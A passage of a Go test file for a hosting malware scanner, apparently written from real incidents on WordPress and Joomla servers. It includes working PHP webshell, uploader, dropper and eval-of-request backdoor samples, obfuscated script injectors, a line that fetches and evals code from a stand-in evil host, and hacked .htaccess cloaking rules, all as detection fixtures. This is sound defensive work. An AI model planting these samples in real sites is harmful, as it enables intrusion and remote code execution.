		"shop/checkout.html": "<div class=\"g-recaptcha\">I'm not a robot</div><button onclick=\"navigator.clipboard.writeText('SAVE10')\">Copy code</button><p>Windows and Mac users welcome.</p>",
		// A cache plugin passing Cloudflare's visitors.
		"wp-content/plugins/cache/bypass.php": "<?php\nif (isset($_COOKIE['cf_clearance'])) { define('DONOTCACHEPAGE', true); }\n",
		// A DNS lookup tool and an admin-only TXT check.
		"wp-content/plugins/dns-tool/dns.php":  "<?php\nadd_action('wp_ajax_nopriv_dns_lookup', function () { $r = dns_get_record(sanitize_text_field($_POST['domain']), DNS_TXT); wp_send_json_success(wp_list_pluck($r, 'txt')); });\n",
		"wp-content/plugins/verify/verify.php": "<?php\nadd_action('wp_ajax_verify_domain', function () { $r = dns_get_record('_verify.example.com', DNS_TXT); wp_send_json_success($r[0]['txt']); });\n",
		// A temporary support login (no hiding) and a plugin hiding a user it did not make.
		"wp-content/plugins/temp-login/login.php": "<?php\n$id = wp_insert_user(array('user_login' => 'support', 'user_pass' => wp_generate_password(32), 'role' => 'administrator'));\n",
		"wp-content/plugins/hide-user/hide.php":   "<?php\nadd_action('pre_user_query', function ($q) { $q->query_where .= ' AND ID <> ' . (int) get_option('hidden_user'); });\n",
		// A login policy: a setting decides, by address.
		"wp-content/plugins/lock/lock.php": "<?php\nadd_filter('authenticate', function ($u) { if (get_option('lock_logins') && $_SERVER['REMOTE_ADDR'] !== get_option('office_ip')) { return new WP_Error('locked', 'Locked'); } return $u; }, 30);\n" +
			"add_filter('allow_password_reset', '__return_false');\nadd_filter('rest_authentication_errors', function ($r) { if (!is_user_logged_in()) { return new WP_Error('no', 'no'); } return $r; });\n",
		// A hidden file of base64 that is not code.
		".cache_9f8e7d6c": base64.StdEncoding.EncodeToString([]byte(strings.Repeat(`{"inert":true,"items":[1,2,3]}`, 20))),
	} {
		if d := check(put(rel, body)); d != nil {
			t.Errorf("%s flagged: %+v", rel, d)
		}
	}

	ht := "# maintenance stub\nRewriteEngine On\nRewriteCond %{REQUEST_URI} ^/captcha\\.html$ [NC,OR]\nRewriteCond %{REQUEST_URI} ^/wp-admin [NC]\nRewriteRule .* - [L]\n" +
		"RewriteCond %{REQUEST_URI} ^/$\nRewriteRule ^ /captcha.html [R=302,L]\nRewriteCond %{REQUEST_FILENAME} -f\nRewriteRule \\.(html?|css|js|png)$ /captcha.php [R=302,L]\n"
	if d := htaccessHack([]byte(ht)); d == nil || d.Signature != "Htaccess.Hacked.CaptchaRedirect" {
		t.Errorf("kit .htaccess: %+v", d)
	}
	clean := string(CleanHtaccess([]byte(ht+"\n# BEGIN WordPress\nRewriteRule ^index\\.php$ - [L]\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteRule . /index.php [L]\n# END WordPress\n"), "/"))
	if strings.Contains(clean, "captcha") || !strings.Contains(clean, "RewriteRule . /index.php [L]") || htaccessHack([]byte(clean)) != nil {
		t.Errorf("cleaned kit .htaccess:\n%s", clean)
	}
	for _, own := range []string{
		"RewriteEngine On\nRewriteCond %{REQUEST_URI} !^/maintenance\\.html$\nRewriteRule ^ /maintenance.html [R=302,L]\n",
		"RewriteEngine On\nRewriteCond %{HTTP_COOKIE} !human=1\nRewriteCond %{REQUEST_URI} !^/captcha\\.php\nRewriteRule ^ /captcha.php [R=302,L]\n",
		"RewriteEngine On\nRewriteRule ^old-captcha/?$ /captcha.php [R=301,L]\n",
	} {
		if d := htaccessHack([]byte(own)); d != nil {
			t.Errorf("site's own rule %q: %+v", own, d)
		}
	}
}

// Real plugins scanned for 0.23.40 (security, CAPTCHA, login, cache and
// copy-button plugins): iThemes Security looks for 'eval(' in the request
// URI (a string, no call), and Duplicator's installer page carries minified
// jQuery in its HTML (no PHP one-liner). The real thing stays caught.
func TestFleetStringsAndHTMLAreNoCode(t *testing.T) {
	line := "<script>" + strings.Repeat("var a=b+'x'+c+'y'+d;", 120) + "var f=$e(1);eval(z);</script>"
	for name, body := range map[string]string{
		"eval( in a string":  "<?php\nif ( strpos( $_SERVER['REQUEST_URI'], 'eval(' ) || strpos( $_GET['q'], 'base64' ) ) { header( 'HTTP/1.1 414' ); exit; }\n",
		"jQuery in the HTML": "<?php if (!defined('INIT')) { header('Location: /'); exit; } ?>\n<html><head>" + line + "</head><body><?php echo $x; ?></body></html>\n",
	} {
		if d := analyze(".php", []byte(body)); d != nil {
			t.Errorf("%s: %+v", name, d)
		}
	}
	packed := "<?php " + strings.Repeat("$a.='x'.'y';", 200) + "eval(base64_decode($a));"
	for name, body := range map[string]string{
		"eval of input":           "<?php eval($_POST['c']);",
		"assert of a code string": "<?php assert(\"eval(\\$_POST['c'])\");",
		"packed PHP one-liner":    packed,
		"packed after HTML":       "<html><body>hello</body></html>\n" + packed,
	} {
		if d := analyze(".php", []byte(body)); d == nil || d.Category != CatVirus {
			t.Errorf("%s: %+v", name, d)
		}
	}
}

// server1 (2026-10-28): plugins uploaded through wp-admin with known
// passwords - a plugin hiding itself and printing a script to visitors, a
// fake core plugin loading a script by an XOR-ed URL - and the shells next
// to them. None had a finding. Inert shapes, then look-alikes.
func TestFleetUploadedPluginCampaign(t *testing.T) {
	b64 := strings.Repeat(strings.Repeat("QUJD", 19)+"\n", 300)
	ints := strings.TrimSuffix(strings.Repeat("152,229,232,", 12), ",")
	hide := "add_filter( 'all_plugins', function( $plugins ) {\n    unset( $plugins[ plugin_basename( __FILE__ ) ] );\n    return $plugins;\n}, 23 );\n"
	kit := map[string]struct{ sig, body string }{
		"self-hiding injector": {"PHP.Backdoor.SelfHidingInjector", "<?php\n/* Plugin Name: wp-warden */\n" + hide +
			"function w_src() { $raw = <<<'_B'\n" + b64 + "_B;\n return base64_decode($raw); }\n" +
			"function w_out() { if (is_admin()) return; echo '<scr' . 'ipt>' . w_src() . '</scr' . 'ipt>'; }\nadd_action( 'wp_head', 'w_out', 1 );\n"},
		"XOR-ed script URL": {"PHP.Injector.HiddenScriptURL", "<?php\n/* Plugin Name: WP-CORE */\nfunction h($b, $k) { $o = ''; for ($i = 0; $i < count($b); $i++) { $o .= chr($b[$i] ^ ord($k[$i % strlen($k)])); } return $o; }\n" +
			"function src() { $k = implode('', array_map('chr', [240,145,156])); return h([" + ints + "], $k); }\n" +
			"add_action('wp_enqueue_scripts', function () { $src = src(); wp_enqueue_script('wp-core', $src, array(), '1', true); });\n"},
		"uploader": {"PHP.Webshell.Uploader", "<?php\necho \"<title>uploader</title>\";\nif (isset($_POST['Submit'])) { $n = $_FILES['image']['name']; @move_uploaded_file($_FILES['image']['tmp_name'], $n); echo $n; }\n" +
			"else { echo '<form method=\"POST\" enctype=\"multipart/form-data\"><input type=\"file\" name=\"image\"><input type=\"submit\" name=\"Submit\"></form>'; }\n"},
		"file manager": {"PHP.Webshell.FileManager", "<?php\n@ini_set('open_basedir', NULL);\n$p = isset($_GET['p']) ? $_GET['p'] : '.';\n$items = scandir($p);\n" +
			"if (isset($_POST['save'])) { file_put_contents($_GET['edit'], $_POST['content']); }\nif (isset($_FILES['upload'])) { move_uploaded_file($_FILES['upload']['tmp_name'], $p . '/x'); }\n" +
			"if (isset($_GET['delete'])) { unlink($_GET['delete']); }\nif (isset($_POST['newname'])) { rename($_POST['oldname'], $_POST['newname']); }\n"},
		"escaped request names": {"PHP.Obfuscated.EscapedInput", "<?php\ngoto a; a: $v = $_GET[\"\\x76\\151\\x65\\x77\"];\ngoto b; b: if (isset($_FILES[\"\\x66\\151\\x6c\\145\"])) { echo $v; }\n"},
	}
	for name, k := range kit {
		if d := analyze(".php", []byte(k.body)); d == nil || d.Signature != k.sig || d.Category != CatVirus {
			t.Errorf("%s: want %s, got %+v", name, k.sig, d)
		}
	}
	for name, body := range map[string]string{
		// MainWP-style: hidden by a setting; a white-label plugin hidden
		// with no script for visitors; an analytics snippet printed but not hidden.
		"hidden by a setting": "<?php\nadd_filter('all_plugins', function ($p) { if (get_option('hide_child')) { unset($p[plugin_basename(__FILE__)]); } return $p; });\n" +
			"add_action('wp_head', function () { echo '<scr' . 'ipt>var a=1;</scr' . 'ipt>'; });\n",
		"white label": "<?php\n" + hide + "add_action('admin_menu', function () { remove_menu_page('tools.php'); });\n",
		"analytics":   "<?php\nadd_action('wp_head', function () { echo '<script async src=\"https://www.googletagmanager.com/gtag/js?id=G-X\"></script>'; });\n",
		// A script from the plugin's own folder, and XOR without a script.
		"own script":  "<?php\nadd_action('wp_enqueue_scripts', function () { $src = plugins_url('a.js', __FILE__); wp_enqueue_script('a', $src); });\n",
		"XOR licence": "<?php\nfunction d($b, $k) { $o = ''; foreach ($b as $i => $c) { $o .= chr($c ^ ord($k[$i % 3])); } return $o; }\n$key = d([" + ints + "], 'abc');\nwp_enqueue_script('a', plugins_url('a.js', __FILE__));\n",
		// Upload handlers that check what they get, or who sends it.
		"checked upload": "<?php\n$ext = strtolower(pathinfo($_FILES['f']['name'], PATHINFO_EXTENSION));\nif (in_array($ext, ['jpg', 'png'])) { move_uploaded_file($_FILES['f']['tmp_name'], 'img/' . $_FILES['f']['name']); }\n" +
			"echo '<form enctype=\"multipart/form-data\" method=\"post\"><input type=\"file\" name=\"f\"></form>';\n",
		"logged-in upload": "<?php\nsession_start(); if (empty($_SESSION['user'])) { exit; }\nmove_uploaded_file($_FILES['f']['tmp_name'], 'files/' . $_FILES['f']['name']);\n" +
			"echo '<form enctype=\"multipart/form-data\" method=\"post\"><input type=\"file\" name=\"f\"></form>';\n",
		// A file manager that leaves open_basedir alone (judged by other rules).
		"plain request names": "<?php\n$v = $_GET['view']; $f = $_FILES['file']; $x = $_POST[\"\\x61b\"];\n",
	} {
		if d := pluginInjectors([]byte(body), func(w string) bool { return strings.Contains(body, w) }); d != nil {
			t.Errorf("%s: %+v", name, d)
		}
	}
}

// server1 (2026-10-30): the credential theft farm's links were made again
// after a full scan quarantined them; symlink() writes no file, so realtime
// protection never saw a link. A new link to another account's secrets is
// now caught as it is made; a link the administrator restored stays.
func TestRealtimeCatchesNewLinks(t *testing.T) {
	if os.Geteuid() != 0 {
		t.Skip("needs root to own files as another user")
	}
	s := newScanner(t)
	if _, err := s.Settings.Patch([]byte(`{"scanner":{"virus_action":"quarantine"}}`)); err != nil {
		t.Fatal(err)
	}
	dir := t.TempDir()
	victim, thief := filepath.Join(dir, "victim"), filepath.Join(dir, "thief")
	os.MkdirAll(filepath.Join(thief, "public_html/kit"), 0o755)
	os.MkdirAll(victim, 0o711)
	secret := filepath.Join(victim, "wp-config.php")
	os.WriteFile(secret, []byte("<?php // inert"), 0o640)
	os.Chown(victim, 65534, 65534)
	os.Chown(secret, 65534, 65534)
	homesCache.Lock()
	homesCache.m, homesCache.at = map[uint32]string{65534: victim, 65533: thief}, time.Now()
	homesCache.Unlock()
	defer func() { homesCache.Lock(); homesCache.m = nil; homesCache.Unlock() }()

	rt := &Realtime{S: s}
	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()
	if err := rt.init([]string{thief}); err != nil {
		t.Skip("inotify unavailable:", err)
	}
	go rt.loop(ctx)
	time.Sleep(300 * time.Millisecond)
	link := filepath.Join(thief, "public_html/kit/victim-wp-config.txt")
	os.Symlink(secret, link)
	os.Lchown(link, 65533, 65533)
	var f Finding
	for deadline := time.Now().Add(10 * time.Second); time.Now().Before(deadline); time.Sleep(100 * time.Millisecond) {
		if fs, _, _ := s.ListFindings(FindingFilter{}); len(fs) == 1 && fs[0].Status == "quarantined" {
			f = fs[0]
			break
		}
	}
	if f.ID == 0 || f.Source != "realtime" || f.Category != CatSymlink {
		t.Fatalf("new link not caught: %+v", f)
	}
	if _, err := os.Lstat(link); !os.IsNotExist(err) {
		t.Fatal("link still there")
	}
	if err := s.Restore(f.ID); err != nil {
		t.Fatal(err)
	}
	time.Sleep(2 * time.Second)
	if _, err := os.Lstat(link); err != nil {
		t.Fatalf("restored link taken again: %v", err)
	}
	if fs, _, _ := s.ListFindings(FindingFilter{}); len(fs) != 1 {
		t.Fatalf("restored link recorded again: %+v", fs)
	}
}

// A plugin uploaded through wp-admin (server1, 2026-10-28) was only seen by
// the CMS scan days later: a folder made in wp-content/plugins now tells
// the plugin watch at once; other folders do not.
func TestRealtimeReportsNewPluginFolder(t *testing.T) {
	s := newScanner(t)
	root := t.TempDir()
	os.MkdirAll(filepath.Join(root, "public_html/wp-content/plugins"), 0o755)
	os.MkdirAll(filepath.Join(root, "public_html/wp-content/uploads"), 0o755)
	got := make(chan string, 4)
	rt := &Realtime{S: s, OnPluginDir: func(wp string) { got <- wp }}
	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()
	if err := rt.init([]string{root}); err != nil {
		t.Skip("inotify unavailable:", err)
	}
	go rt.loop(ctx)
	time.Sleep(300 * time.Millisecond)
	os.MkdirAll(filepath.Join(root, "public_html/wp-content/uploads/2026"), 0o755)
	os.MkdirAll(filepath.Join(root, "public_html/wp-content/plugins/system-defence"), 0o755)
	select {
	case wp := <-got:
		if wp != filepath.Join(root, "public_html") {
			t.Fatalf("site %q", wp)
		}
	case <-time.After(5 * time.Second):
		t.Fatal("new plugin folder not reported")
	}
	select {
	case wp := <-got:
		t.Fatalf("reported again: %q", wp)
	case <-time.After(500 * time.Millisecond):
	}
}

// Kits lock their shells with chattr +i (and the folder holding them) so
// that cleanup fails: quarantine clears the lock of the file it takes and,
// for the move only, of its folder.
func TestQuarantineLockedFile(t *testing.T) {
	if os.Geteuid() != 0 {
		t.Skip("needs root for chattr")
	}
	s := newScanner(t)
	if _, err := s.Settings.Patch([]byte(`{"scanner":{"virus_action":"quarantine"}}`)); err != nil {
		t.Fatal(err)
	}
	dir := filepath.Join(t.TempDir(), "public_html", "wp-content", "uploads")
	os.MkdirAll(dir, 0o755)
	p := filepath.Join(dir, "x.php")
	os.WriteFile(p, []byte(malicious["exec.php"]), 0o644)
	os.Chown(p, 65534, 65534) // an account's file (root's are never acted on)
	setFlags := func(path string, set bool) error {
		f, err := os.Open(path)
		if err != nil {
			return err
		}
		defer f.Close()
		v, err := unix.IoctlGetInt(int(f.Fd()), unix.FS_IOC_GETFLAGS)
		if err != nil {
			return err
		}
		if set {
			v |= 0x10
		} else {
			v &^= 0x10
		}
		return unix.IoctlSetPointerInt(int(f.Fd()), unix.FS_IOC_SETFLAGS, v)
	}
	if err := setFlags(p, true); err != nil {
		t.Skip("filesystem without chattr:", err)
	}
	if err := setFlags(dir, true); err != nil {
		t.Skip("filesystem without chattr:", err)
	}
	defer setFlags(dir, false)
	if err := os.Remove(p); err == nil {
		t.Fatal("the lock does not hold")
	}
	info, _ := os.Lstat(p)
	f, err := s.Record(0, "manual", p, info, Detection{CatVirus, "PHP.Backdoor.ExecInput"})
	if err != nil || f.Status != "quarantined" {
		t.Fatalf("locked file not quarantined: %s %v", f.Status, err)
	}
	if _, err := os.Lstat(p); !os.IsNotExist(err) {
		t.Fatal("locked file still there")
	}
	d, _ := os.Open(dir)
	v, _ := unix.IoctlGetInt(int(d.Fd()), unix.FS_IOC_GETFLAGS)
	d.Close()
	if v&0x10 == 0 {
		t.Error("the folder's own lock was not put back")
	}
}

// SEO cloaking in a hacked .htaccess: visitors from a search engine sent
// to another site, crawlers given a PHP doorway or another site. Caching,
// prerender, mobile, hotlink and bad-bot rules of real sites stay clean,
// and the cleaner keeps them while dropping the kit's rules.
func TestFleetHtaccessCloaking(t *testing.T) {
	for _, kit := range []string{
		"RewriteEngine On\nRewriteCond %{HTTP_REFERER} (google|bing|yahoo) [NC]\nRewriteRule ^(.*)$ https://example.invalid/offer [R=302,L]\n",
		"RewriteEngine On\nRewriteCond %{HTTP_USER_AGENT} (googlebot|bingbot|baiduspider) [NC]\nRewriteRule ^(.*)$ /wp-content/uploads/.cache/sitemap.php?u=$1 [L]\n",
		"RewriteEngine On\nRewriteCond %{HTTP_USER_AGENT} Googlebot [NC,OR]\nRewriteCond %{HTTP_USER_AGENT} Bingbot [NC]\nRewriteRule ^ http://example.invalid/d.php [P,L]\n",
	} {
		if d := htaccessHack([]byte(kit)); d == nil || d.Signature != "Htaccess.Hacked.SearchCloaking" || d.Category != CatVirus {
			t.Errorf("kit not caught: %+v\n%s", d, kit)
		}
	}
	for _, own := range []string{
		// LiteSpeed Cache: a cache vary for crawlers (target "-").
		"RewriteCond %{HTTP_USER_AGENT} (chrome-lighthouse|googlebot|page\\ speed) [NC,OR]\nRewriteCond %{HTTP_USER_AGENT} Firefox/([6-9][0-9]) [NC]\nRewriteRule .* - [E=Cache-Control:vary=%{ENV:LSCACHE_VARY_VALUE}+webp]\n",
		// A prerender service for crawlers.
		"RewriteCond %{HTTP_USER_AGENT} googlebot|bingbot|yandex [NC]\nRewriteRule ^(.*)$ http://service.prerender.io/https://%{HTTP_HOST}/$1 [P,L]\n",
		// Mobile site, hotlink protection, bad bots refused, crawlers to the
		// same site, a referer block.
		"RewriteCond %{HTTP_USER_AGENT} (android|iphone) [NC]\nRewriteRule ^$ https://m.example.com/ [R=302,L]\n",
		"RewriteCond %{HTTP_REFERER} !^$\nRewriteCond %{HTTP_REFERER} !^https?://(www\\.)?example\\.com [NC]\nRewriteRule \\.(jpe?g|png)$ - [F]\n",
		"RewriteCond %{HTTP_USER_AGENT} (AhrefsBot|MJ12bot) [NC]\nRewriteRule .* - [F,L]\n",
		"RewriteCond %{HTTP_USER_AGENT} googlebot [NC]\nRewriteRule ^old/(.*)$ https://%{HTTP_HOST}/new/$1 [R=301,L]\n",
		"RewriteCond %{HTTP_REFERER} google [NC]\nRewriteRule ^promo$ /index.php?page=promo [L]\n",
		// Softaculous's bot protection (business300 deversco, 2026-10-30):
		// Baiduspider among bad bots, sent nowhere.
		"RewriteCond %{HTTP_USER_AGENT} (?:virusbot|spambot|evilbot|acunetix|BLEXBot|MJ12bot/v|AhrefsBot|SemrushBot|nikto|Baiduspider|HTTrack|python-requests) [NC]\nRewriteRule ^(.*)$ http://no.access/\n",
		"RewriteCond %{HTTP_USER_AGENT} (Baiduspider|YandexBot) [NC]\nRewriteRule .* http://127.0.0.1/ [R=301,L]\n",
	} {
		if d := htaccessHack([]byte(own)); d != nil {
			t.Errorf("site's own rule flagged: %+v\n%s", d, own)
		}
	}
	site := "# BEGIN LSCACHE\nRewriteCond %{HTTP_USER_AGENT} (chrome-lighthouse|googlebot) [NC]\nRewriteRule .* - [E=Cache-Control:vary=x]\n# END LSCACHE\n" +
		"RewriteCond %{HTTP_REFERER} (google|bing) [NC]\nRewriteRule ^(.*)$ https://example.invalid/offer [R=302,L]\n" +
		"# BEGIN WordPress\nRewriteRule ^index\\.php$ - [L]\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteRule . /index.php [L]\n# END WordPress\n"
	clean := string(CleanHtaccess([]byte(site), "/"))
	if strings.Contains(clean, "example.invalid") || !strings.Contains(clean, "LSCACHE_VARY") && !strings.Contains(clean, "vary=x") || !strings.Contains(clean, "RewriteRule . /index.php [L]") || htaccessHack([]byte(clean)) != nil {
		t.Errorf("cleaned:\n%s", clean)
	}
}

// Full scans of 2026-10-30 (server100): library and application files
// taken for backdoors - assert() of a type check on request data
// (OpenTelemetry, php-saml), a method named exec and a fixed exec('whoami')
// (Afterlogic DAV, Yii debug), a canvas image saved from a data URI
// (Chamilo badges), a debug log of cookies (Retina Images). The same calls
// fed by the request stay caught.
func TestFleetLibrariesOfFullScan(t *testing.T) {
	clean := map[string]string{
		"assert type check": "<?php class R { private function v($n) { $value = $_SERVER[$n] ?? null; if ($value !== null) { assert(is_string($value)); return $value; } return getenv($n); } }",
		"assert on request": "<?php class A { function go($url = '') { assert(is_string($url)); if (empty($url) && isset($_REQUEST['RelayState'])) { $url = $_REQUEST['RelayState']; } return $url; } }",
		"method named exec": "<?php class S { public function exec() { $u = empty($_SERVER['REQUEST_URI']) ? '' : trim($_SERVER['REQUEST_URI']); if (!strpos(urldecode($u), '../')) { $this->start(); } } }",
		"fixed command":     "<?php $s = ['ip' => $console ? exec('whoami') : $req->getUserIP(), 'time' => $_SERVER['REQUEST_TIME_FLOAT']];",
		"canvas image":      "<?php api_protect_admin_script(); $path = sprintf('%s%s.png', $dir, sha1($name));\nif (!empty($_POST['badge_image'])) { $img = base64_decode(preg_replace('#^data:image/\\w+;base64,#i', '', $_POST['badge_image'])); file_put_contents($path, $img); }",
		"application upload page": "<?php exit;\nif (isset($_FILES['user_upload'])) { $p = handle_uploaded_document($course, $_FILES['user_upload'], $dir); echo build_missing_files_form($missing, $_FILES['user_upload']['name']); }\n" +
			"if (isset($_POST['submit_image'])) { $paths = move_uploaded_file_collection_into_directory($course, $_FILES['img_file'], $dir); }\n?><form method=\"POST\" enctype=\"multipart/form-data\"><input type=\"file\" name=\"user_upload\"/></form>",
		"debug log": "<?php $uri = parse_url(urldecode($_SERVER['REQUEST_URI']), PHP_URL_PATH);\nif (DEBUG) { $fh = fopen('retinaimages.log', 'a'); fwrite($fh, print_r($_COOKIE, true)); fwrite($fh, \"uri: {$uri}\\n\"); }",
	}
	for name, body := range clean {
		if d := analyze(".php", []byte(body)); d != nil {
			t.Errorf("%s: %+v", name, d)
		}
	}
	bad := map[string]string{
		"eval of input":            "<?php eval($_POST['c']);",
		"eval inside a type check": "<?php assert(is_string($x) || eval($_POST['c']));",
		"command with input":       "<?php system('ls ' . $_GET['d']);",
		"own exec wrapper":         "<?php function exec2($c) { return 1; } function run($c) { system($c); } run($_GET['x']); system($_GET['y']);",
		"dropper":                  "<?php file_put_contents($_GET['f'], base64_decode($_POST['d']));",
		"image-wrapped dropper":    "<?php file_put_contents($_POST['name'], base64_decode(preg_replace('#^data:image/\\w+;base64,#i', '', $_POST['img'])));",
		"log then include":         "<?php $fh = fopen('x.txt', 'w'); fwrite($fh, base64_decode($_POST['c'])); fclose($fh); include 'x.txt';",
	}
	for name, body := range bad {
		if d := analyze(".php", []byte(body)); d == nil || d.Category != CatVirus {
			t.Errorf("%s not caught: %+v", name, d)
		}
	}
}

// business600 joomlash (2026-10-27): Joomla's page cache files
// (administrator/cache/page/<hash>-cache-page-<hash>.php) were quarantined
// as PHP.Suspicious.EncodedPayload again and again: '<?php die("Access
// Denied"); ?>' and then the saved page, whose articles show code. Nothing
// after the die runs. A die that runs code, a string that interpolates, a
// phar stub and code before the die are still judged.
func TestFleetJoomlaPageCache(t *testing.T) {
	s := newScanner(t)
	page := `<!DOCTYPE html><html><body><article><h1>Decode a payload</h1><pre>eval(base64_decode($_POST['p']));</pre><pre>` +
		strings.Repeat("QWxsIHRoZSB3b3JsZCdzIGEgc3RhZ2UsIGFuZCBhbGwgdGhlIG1lbiBhbmQgd29tZW4gbWVyZWx5IHBsYXllcnMu", 60) + `</pre></article></body></html>`
	cache := `<?php die("Access Denied"); ?>#x#a:2:{s:4:"body";s:` + fmt.Sprint(len(page)) + `:"` + page + `";s:7:"headers";a:0:{}}`
	path := "/home/u/public_html/administrator/cache/page/43e9356a2131a56aa57f050ccd40faa6-cache-page-8b9bba353f2b40a92b0e0cd9ee7f5acd.php"
	if d := s.checkContent(path, ".php", []byte(cache)); d != nil {
		t.Errorf("Joomla page cache: %s", d.Signature)
	}
	for _, stop := range []string{"<?php exit; ?>", "<?php die(); ?>", "<?php die('No direct access') ?>", "\xef\xbb\xbf<?php\nexit;\n?>"} {
		if !inertPHP([]byte(stop + "\n<?php eval($_POST['c']); ?>")) {
			t.Errorf("%q not read as stopping at once", stop)
		}
	}
	payload := "<?php eval(base64_decode($_POST['p'])); ?>"
	bad := map[string]string{
		"die that runs code":       `<?php die(eval(base64_decode($_POST['p']))); ?>` + page,
		"interpolating string":     `<?php die("{${eval(base64_decode($_POST['p']))}}"); ?>` + page,
		"phar stub":                `<?php die(); __HALT_COMPILER(); ?>` + payload,
		"code before the die":      `<?php eval(base64_decode($_POST['p'])); die("Access Denied"); ?>` + page,
		"die only in a condition":  `<?php if (!defined('X')) die("Access Denied"); eval(base64_decode($_POST['p'])); ?>`,
		"die inside a later block": `<?php $a = 1; ?><?php die("Access Denied"); ?>` + payload,
	}
	for name, body := range bad {
		if inertPHP([]byte(body)) {
			t.Errorf("%s: read as inert", name)
		}
		if d := s.checkContent(path, ".php", []byte(body)); d == nil {
			t.Errorf("%s: not caught", name)
		}
	}
}

// business600 joomlash (2026-10-27): JSitemap Pro's AjaxserverModel.php and
// the JExtStore packages in jdownloads (JComments, GDPR, JSpeed …) were
// quarantined as PHP.Obfuscated.SplitFunctionName: the vendor spells
// str_rot13 in pieces to build its own license and update address. A split
// decoder whose result is code or a function name, or that reads request
// data, is still caught.
func TestFleetJExtStoreLicenseAddress(t *testing.T) {
	s := newScanner(t)
	path := "/home/u/public_html/administrator/components/com_jmap/Model/AjaxserverModel.php"
	vendor := "<?php\ndefined('_JEXEC') or die('Restricted access');\nclass AjaxserverModel {\n" +
		"\tprivate function getLicenseStatus() {\n\t\t$code = 'x';\n\t\t$cdFuncUsed = 'str_' . 'ro' . 't' . '13';\n" +
		"\t\t$r = $this->http->get($cdFuncUsed('uggc' . '://' . 'fgberwrkgrafvbaf' . '.bet') . \"/option,com_easycommerce/action,licenseCode/email,$code\");\n\t\treturn $r;\n\t}\n" +
		"\tprivate function downloadComponentUpdate() {\n\t\t$cdFuncUsed = 'str_' . 'ro' . 't' . '13';\n" +
		"\t\t$ep = $cdFuncUsed('uggc' . '://' . 'fgberwrkgrafvbaf' . '.bet' . '/XZY1406TSPQnifs3243560923kfuxnj35td1rtt45664f.ugzy');\n\t\treturn $ep;\n\t}\n" +
		"\tpublic function loadAjaxEntity($id, $param) { return $this->$id($param); }\n}\n"
	if d := s.checkContent(path, ".php", []byte(vendor)); d != nil {
		t.Errorf("JExtStore license address: %s", d.Signature)
	}
	bad := map[string]string{
		"decoded function name called": "<?php $f = 'str_' . 'ro' . 't' . '13'; $f('flfgrz')($_GET['c']);",
		"decoded name kept and called": "<?php $f = 'str_' . 'ro' . 't' . '13'; $g = $f('flfgrz'); $g($_GET['c']);",
		"decoder on request data":      "<?php $f = 'base' . '64_' . 'decode'; $g = 'cre' . 'ate_' . 'function'; $x = $f($_POST['p']); $y = $g('', $x); $y();",
		"decoded url then eval":        "<?php $f = 'base' . '64_' . 'decode'; eval(file_get_contents($f('aHR0cDovL2V2aWwuZXhhbXBsZS94')));",
		"decoder passed on":            "<?php $f = 'str_' . 'ro' . 't' . '13'; $n = array_map($f, ['flfgrz']); $h = $n[0]; $h($_GET['c']);",
	}
	for name, body := range bad {
		if d := s.checkContent("/home/u/public_html/x.php", ".php", []byte(body)); d == nil || d.Category != CatVirus {
			t.Errorf("%s not caught: %+v", name, d)
		}
	}
}

// The full scans of 2026-11-01 (business900, server100, business200):
// a site's own admin pages that upload images (softpanel add_awards.php
// on 40 accounts: the login is checked in an included file and only jpg,
// png and gif are kept; blog and logo pages that write the upload to their
// database), contact forms that send the visitor a copy, and updater copies
// beside the files they replace. Inert shapes; the attacker's one-page
// uploader and a mail relay next to them stay caught.
func TestFleetFullScanOwnPages(t *testing.T) {
	form := "<form method=\"post\" enctype=\"multipart/form-data\"><input type=\"file\" name=\"large\"></form>\n"
	has := func(b string) func(string) bool { return func(w string) bool { return strings.Contains(b, w) } }
	for name, body := range map[string]string{
		"admin page, session in an include, extension list": "<?php\ninclude_once(\"connection.php\");\ninclude_once(\"chksession.php\");\n$GALLERY_PATH = \"awards/\";\n" +
			"$ext = strtolower(end(explode('.', $_FILES['large']['name'])));\nif ($ext == \"jpg\" || $ext == \"png\" || $ext == \"gif\") {\n// $tmp = session_id() . time() . \".$ext\";\n$tmp = \"large-$id.$ext\";\nmove_uploaded_file($_FILES['large']['tmp_name'], $GALLERY_PATH . $tmp); }\n?>\n" + form,
		"blog page writing to its database": "<?php\ninclude ('dashboard_header.php');\nif (isset($_FILES['blog_image'])) { $blog_image = $_FILES['blog_image']['name']; $img = \"upload/\" . basename($_FILES['blog_image']['name']);\n" +
			"move_uploaded_file($_FILES['blog_image']['tmp_name'], $img); }\n$q = \"INSERT INTO blog (blog_name, blog_image) VALUES ('$n', '$blog_image')\";\nmysqli_query($connect, $q);\n?>\n" + form,
		"logo page updating a record": "<?php\ninclude 'db.php';\n$logo = $_FILES['currency_logo']['name'];\n$target_file = 'uploads/' . basename($logo);\nif (move_uploaded_file($_FILES['currency_logo']['tmp_name'], $target_file)) {\n" +
			"$sql = \"UPDATE gateway_currencies SET image='$logo' WHERE id='$id'\";\n$conn->query($sql); }\n?>\n" + form,
	} {
		if d := pluginInjectors([]byte(body), has(body)); d != nil {
			t.Errorf("%s: %+v", name, d)
		}
	}
	// The attacker's uploader: no login, no check, no record, the sent name.
	shell := "<?php\nif (isset($_POST['go'])) { $n = $_FILES['f']['name']; @move_uploaded_file($_FILES['f']['tmp_name'], $n); echo 'ok'; }\n?>\n" + form
	if d := pluginInjectors([]byte(shell), has(shell)); d == nil || d.Signature != "PHP.Webshell.Uploader" {
		t.Errorf("uploader: %+v", d)
	}
	// Even when it names a table in a comment-free string it never runs.
	shellSQL := strings.Replace(shell, "echo 'ok';", "echo 'INSERT INTO x';", 1)
	if d := pluginInjectors([]byte(shellSQL), has(shellSQL)); d == nil {
		t.Errorf("uploader with an SQL word: not caught")
	}

	contact := map[string]string{
		"copy to the sender": "<?php\nif (isset($_POST['submit'])) {\n$to = \"info@example.com\";\n$from = $_POST['email'];\n$subject = \"Form submission\";\n$subject2 = \"Copy of your form submission\";\n" +
			"$message2 = \"Here is a copy of your message\\n\\n\" . $_POST['message'];\nmail(\"<$to>\", \"<$subject>\", \"$message2\", \"From:<$from>\");\nmail(\"<$from>\", \"<$subject2>\", \"$message2\", \"From:<$to>\");\n}\n?>\n<form method=\"post\"><input name=\"email\"></form>\n",
